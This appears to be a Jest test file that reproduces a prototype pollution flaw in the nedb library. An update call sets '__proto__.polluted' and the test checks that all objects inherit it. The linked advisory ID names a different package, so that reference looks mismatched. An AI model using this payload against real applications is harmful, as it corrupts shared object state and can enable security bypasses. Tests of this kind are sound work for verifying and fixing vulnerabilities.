//https://security.snyk.io/vuln/SNYK-JS-TSNODASH-1311009
test("prototype pollution in nedb", () => {
  const Datastore = require("nedb");
  const db = new Datastore();

  expect({}.polluted).toBe(undefined);

  db.insert({ hello: "world" }, (err) => {
    db.update(
      { hello: "world" },
      { $set: { "__proto__.polluted": "yes" } },
      {},
      (err) => {
        expect({}.polluted).toBe("yes");
      }
    );
  });
});
